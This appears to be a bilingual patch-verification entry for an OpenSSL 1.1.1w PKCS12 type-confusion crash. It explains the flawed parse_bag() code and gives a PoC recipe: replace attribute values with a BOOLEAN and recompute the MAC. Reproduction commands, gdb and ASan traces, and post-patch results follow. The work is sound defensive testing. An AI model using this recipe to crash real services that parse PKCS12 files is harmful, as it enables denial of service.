# 015 of 033 — CVE-2026-22795 (PKCS12-attr-type-confusion-DoS)

Log file: `20261102_121856_015of033_CVE-2026-22795_PKCS12-attr-type-confusion-DoS.log`

Verdict / 判定: **PASS**

## Vulnerability mechanism (as observed in the code) / 脆弱性のメカニズム (コード上の確認)

crypto/pkcs12/p12_kiss.c (pristine 1.1.1w) parse_bag(): 'if ((attrib = PKCS12_SAFEBAG_get0_attr(bag, NID_friendlyName))) fname = attrib->value.bmpstring; if ((attrib = PKCS12_SAFEBAG_get0_attr(bag, NID_localKeyID))) lkid = attrib->value.octet_string;' then, for NID_certBag, 'if (lkid && !X509_keyid_set1(x509, lkid->data, lkid->length))' (line 217) and 'ASN1_STRING_to_UTF8(&data, fname)' (line 224). The ANY decoder stores a BOOLEAN's content byte in the union (value.boolean = 0xff), so both pointers become 0xff. NULL-typed values are harmless here because of the 'if (fname)' / 'if (lkid && ...)' guards, and ASN1_STRING-based wrong types (e.g. UTF8String) are silently accepted. The patch adds 'if (attrib->type != V_ASN1_BMPSTRING) return 0;' and 'if (attrib->type != V_ASN1_OCTET_STRING) return 0;', so any wrong type makes parse_bags() fail and PKCS12_parse() report PKCS12_R_PARSE_ERROR.

crypto/pkcs12/p12_kiss.c (素の 1.1.1w) parse_bag(): 'if ((attrib = PKCS12_SAFEBAG_get0_attr(bag, NID_friendlyName))) fname = attrib->value.bmpstring; if ((attrib = PKCS12_SAFEBAG_get0_attr(bag, NID_localKeyID))) lkid = attrib->value.octet_string;' の後、NID_certBag では 'if (lkid && !X509_keyid_set1(x509, lkid->data, lkid->length))' (217 行) と 'ASN1_STRING_to_UTF8(&data, fname)' (224 行) を実行する。ANY デコーダは BOOLEAN の内容バイトを共用体に格納する (value.boolean = 0xff) ため、両ポインタは 0xff になる。NULL 型の値は 'if (fname)' / 'if (lkid && ...)' のガードにより無害で、ASN1_STRING ベースの誤型 (UTF8String 等) は黙って受理される。パッチは 'if (attrib->type != V_ASN1_BMPSTRING) return 0;' と 'if (attrib->type != V_ASN1_OCTET_STRING) return 0;' を追加し、誤った型があれば parse_bags() が失敗して PKCS12_parse() が PKCS12_R_PARSE_ERROR を報告する。

## PoC design / PoC の設計

Files from the unpatched 'openssl pkcs12 -export -name test -certpbe NONE' (password x / empty). make_bad.py walks authSafes -> AuthenticatedSafe -> pkcs7-data SafeContents -> certBag SafeBags and replaces the attribute value node (BOOLEAN TRUE 01 01 FF, NULL 05 00, UTF8String 0c 04 'test'), then recomputes the MAC (RFC 7292 KDF + HMAC-SHA1). poc_parse.c: d2i_PKCS12_fp -> PKCS12_parse(p12, pass, &pkey, &cert, &ca) and prints subject, alias and key presence. CLI triggers: 'openssl x509 -inform PKCS12 -in badnp_fname_bool.p12' (empty password avoids the interactive prompt of load_pkcs12()) and 'openssl pkey -inform PKCS12 -in bad_lkid_bool.p12 -passin pass:x'. run_poc.sh runs everything on the four builds with gdb and valgrind.

ファイルは未修正の 'openssl pkcs12 -export -name test -certpbe NONE' (パスワード x / 空) で作成。make_bad.py は authSafes -> AuthenticatedSafe -> pkcs7-data の SafeContents -> certBag SafeBag と辿り、属性値ノードを置換 (BOOLEAN TRUE 01 01 FF、NULL 05 00、UTF8String 0c 04 'test') して MAC を再計算する (RFC 7292 KDF + HMAC-SHA1)。poc_parse.c: d2i_PKCS12_fp -> PKCS12_parse(p12, pass, &pkey, &cert, &ca) を呼び、subject、エイリアス、鍵の有無を表示する。CLI の発動経路: 'openssl x509 -inform PKCS12 -in badnp_fname_bool.p12' (空パスワードで load_pkcs12() の対話プロンプトを回避) と 'openssl pkey -inform PKCS12 -in bad_lkid_bool.p12 -passin pass:x'。run_poc.sh が 4 ビルドで gdb・valgrind を含め全実行を行う。

## Observed behaviour BEFORE the patch (evidence excerpts) / パッチ前の挙動 (証拠抜粋)

Unpatched 1.1.1w: PKCS12_parse() on bad_fname_bool.p12 / bad_lkid_bool.p12 and 'openssl x509 -inform PKCS12' / 'openssl pkey -inform PKCS12' die with SIGSEGV (exit 139, 4/4). gdb: 'ASN1_STRING_to_UTF8 (out=..., in=0xff) at crypto/asn1/a_strex.c:611  611  type = in->type;' <- parse_bag (p12_kiss.c:224) <- parse_bags <- parse_pk12 <- PKCS12_parse; and 'parse_bag (...) at crypto/pkcs12/p12_kiss.c:217  217  if (lkid && !X509_keyid_set1(x509, lkid->data, lkid->length))' with '*attrib = {type = 1, value = {ptr = 0xff ...}}' and 'lkid = (ASN1_OCTET_STRING *) 0xff'. BASE-ASAN: 'SEGV on unknown address 0x000000000103 ... READ ... #0 ASN1_STRING_to_UTF8 a_strex.c:611 #1 parse_bag p12_kiss.c:224 ... #5 load_pkcs12 apps/apps.c:591' (0x103 = 0xff + offset of ASN1_STRING.type) and 0x107 for the localKeyID case. The NULL and UTF8String controls do not crash on BASE.

未修正 1.1.1w: bad_fname_bool.p12 / bad_lkid_bool.p12 への PKCS12_parse()、および 'openssl x509 -inform PKCS12' / 'openssl pkey -inform PKCS12' は SIGSEGV (exit 139、4/4) で異常終了。gdb: 'ASN1_STRING_to_UTF8 (out=..., in=0xff) at crypto/asn1/a_strex.c:611  611  type = in->type;' <- parse_bag (p12_kiss.c:224) <- parse_bags <- parse_pk12 <- PKCS12_parse、および 'parse_bag (...) at crypto/pkcs12/p12_kiss.c:217  217  if (lkid && !X509_keyid_set1(x509, lkid->data, lkid->length))' で '*attrib = {type = 1, value = {ptr = 0xff ...}}'、'lkid = (ASN1_OCTET_STRING *) 0xff'。BASE-ASAN: 'SEGV on unknown address 0x000000000103 ... READ ... #0 ASN1_STRING_to_UTF8 a_strex.c:611 #1 parse_bag p12_kiss.c:224 ... #5 load_pkcs12 apps/apps.c:591' (0x103 = 0xff + ASN1_STRING.type のオフセット)、localKeyID の場合は 0x107。対照の NULL と UTF8String は BASE でもクラッシュしない。

```
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7de7e7a in parse_bag (bag=0x555555574a30, pass="x", passlen=-1, pkey=..., ocerts=...) at crypto/pkcs12/p12_kiss.c:217
217	        if (lkid && !X509_keyid_set1(x509, lkid->data, lkid->length)) {
#0  parse_bag (...) at crypto/pkcs12/p12_kiss.c:217
#1  parse_bags (...) at crypto/pkcs12/p12_kiss.c:170
#2  parse_pk12 (...) at crypto/pkcs12/p12_kiss.c:154
#3  PKCS12_parse (p12=..., pass="x", pkey=..., cert=..., ca=...) at crypto/pkcs12/p12_kiss.c:82
#4  main (argc=3, argv=...) at poc_parse.c:26
$1 = {type = 1, value = {ptr = 0xff <error: Cannot access memory at address 0xff>, boolean = 255, ..., octet_string = 0xff, ...}}
$3 = (ASN1_OCTET_STRING *) 0xff
---
==6400==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000103 (pc ... T0)
==6400==The signal is caused by a READ memory access.
    #0 in ASN1_STRING_to_UTF8 ../src_1.1.1w/openssl-1.1.1w/crypto/asn1/a_strex.c:611
    #1 in parse_bag ../src_1.1.1w/openssl-1.1.1w/crypto/pkcs12/p12_kiss.c:224
    #2 in parse_bags ../src_1.1.1w/openssl-1.1.1w/crypto/pkcs12/p12_kiss.c:170
    #3 in parse_pk12 ../src_1.1.1w/openssl-1.1.1w/crypto/pkcs12/p12_kiss.c:154
    #4 in PKCS12_parse ../src_1.1.1w/openssl-1.1.1w/crypto/pkcs12/p12_kiss.c:82
    #5 in load_pkcs12 ../src_1.1.1w/openssl-1.1.1w/apps/apps.c:591
```

## Observed behaviour AFTER the patch / パッチ後の挙動

Patched build (debug and ASan): PKCS12_parse() returns 0 with 'PKCS12 routines:PKCS12_parse:parse error:crypto/pkcs12/p12_kiss.c:83' for all four variants (BOOLEAN friendlyName, BOOLEAN localKeyID, NULL friendlyName, UTF8String friendlyName), and the x509/pkey commands print 'unable to load certificate/key' + the same error with exit 1; no crash, no sanitizer report (10/10 runs).

修正版 (debug と ASan): 4 変種 (BOOLEAN friendlyName、BOOLEAN localKeyID、NULL friendlyName、UTF8String friendlyName) すべてで PKCS12_parse() は 'PKCS12 routines:PKCS12_parse:parse error:crypto/pkcs12/p12_kiss.c:83' を出して 0 を返し、x509/pkey コマンドは 'unable to load certificate/key' と同じエラーで exit 1。クラッシュもサニタイザ報告も無し (10/10 回)。

```
$ ./poc_parse_patched bad_fname_bool.p12 x
[poc] decoded bad_fname_bool.p12, calling PKCS12_parse() ...
...:error:23076072:PKCS12 routines:PKCS12_parse:parse error:../openssl-1.1.1w-ipalongpatch_20261102/crypto/pkcs12/p12_kiss.c:83:
[poc] PKCS12_parse returned 0
[poc] finished without crashing
[exit status: 1]
$ openssl x509 -inform PKCS12 -in badnp_fname_bool.p12 -noout -subject
unable to load certificate
...:error:23076072:PKCS12 routines:PKCS12_parse:parse error:...p12_kiss.c:83:
[exit status: 1]
```

## Regression check / 回帰確認

Patched build: PKCS12_parse() on good.p12 and good_nopass.p12 returns 1 with subject /CN=server.example, alias 'test' (from the BMPString friendlyName) and the private key; the same under ASan; 'openssl pkey -inform PKCS12 -pubout' prints the public key; 'openssl pkcs12 -info' works; a file exported by the patched build with the default encrypted certificate bag parses; valgrind --leak-check=full reports no errors/leaks for malformed and benign files. Note: 'openssl x509 -inform PKCS12' cannot output a certificate in 1.1.1w on any build (load_cert() passes pkey=NULL so PKCS12_parse() never returns the certificate) - a pre-existing app limitation unrelated to the patch; it still reaches parse_bag() and therefore serves as a crash trigger.

修正版: good.p12 と good_nopass.p12 への PKCS12_parse() は 1 を返し、subject /CN=server.example、(BMPString friendlyName 由来の) エイリアス 'test'、秘密鍵が得られる。ASan 下でも同様。'openssl pkey -inform PKCS12 -pubout' は公開鍵を出力、'openssl pkcs12 -info' も動作、修正版で既定 (暗号化証明書バッグ) でエクスポートしたファイルも解析でき、valgrind --leak-check=full は不正・正規ファイルともエラー・リーク無し。注記: 'openssl x509 -inform PKCS12' は 1.1.1w ではどのビルドでも証明書を出力できない (load_cert() が pkey=NULL を渡すため PKCS12_parse() が証明書を返さない) — パッチと無関係の既存のアプリ側制限であり、parse_bag() には到達するためクラッシュの発動経路としては有効。

## How to reproduce manually (step-by-step commands a human can run) / 手動再現手順

```
cd /home/user/work/poc/015_CVE-2026-22795
BASE=/home/user/work/base/openssl-1.1.1w; PAT=/home/user/work/patched/build; SRC=/home/user/work/src_1.1.1w/openssl-1.1.1w
$BASE/util/shlib_wrap.sh $BASE/apps/openssl pkcs12 -export -in $SRC/test/certs/servercert.pem -inkey $SRC/test/certs/serverkey.pem -name test -passout pass:x -certpbe NONE -out good.p12
$BASE/util/shlib_wrap.sh $BASE/apps/openssl pkcs12 -export -in $SRC/test/certs/servercert.pem -inkey $SRC/test/certs/serverkey.pem -name test -passout pass: -certpbe NONE -out good_nopass.p12
python3 -I make_bad.py good.p12 x bad ; python3 -I make_bad.py good_nopass.p12 '' badnp
./build.sh
./poc_parse_base bad_fname_bool.p12 x ; ./poc_parse_base bad_lkid_bool.p12 x          # SIGSEGV
$BASE/util/shlib_wrap.sh $BASE/apps/openssl x509 -inform PKCS12 -in badnp_fname_bool.p12 -noout -subject </dev/null   # SIGSEGV
$BASE/util/shlib_wrap.sh $BASE/apps/openssl pkey -inform PKCS12 -in bad_lkid_bool.p12 -passin pass:x -noout        # SIGSEGV
LD_LIBRARY_PATH=$BASE gdb -q -batch -ex run -ex bt -ex 'print *attrib' -ex 'print lkid' --args ./poc_parse_base bad_lkid_bool.p12 x
./poc_parse_patched bad_fname_bool.p12 x ; ./poc_parse_patched good.p12 x            # parse error / success
./run_poc.sh                                                                         # everything
```

## Limitations / notes / 制限事項・注記

Only BOOLEAN-typed values crash (NULL values are skipped by existing guards, ASN1_STRING-based types are accepted by the unpatched code); the patched build rejects every non-BMPString friendlyName / non-OCTET STRING localKeyID, which also rejects the UTF8String variant that the unpatched code tolerated (upstream behaviour). The apps/s_client.c LDAP StartTLS hardening contained in the same patch was not exercised (needs an LDAP server and is not security relevant).

クラッシュするのは BOOLEAN 型の値のみ (NULL は既存のガードで読み飛ばされ、ASN1_STRING ベースの型は未修正コードでも受理される)。修正版は BMPString でない friendlyName / OCTET STRING でない localKeyID をすべて拒否するため、未修正コードが許容していた UTF8String 変種も拒否する (上流と同じ挙動)。同パッチに含まれる apps/s_client.c の LDAP StartTLS 堅牢化は検証していない (LDAP サーバが必要で、セキュリティ上の問題ではない)。
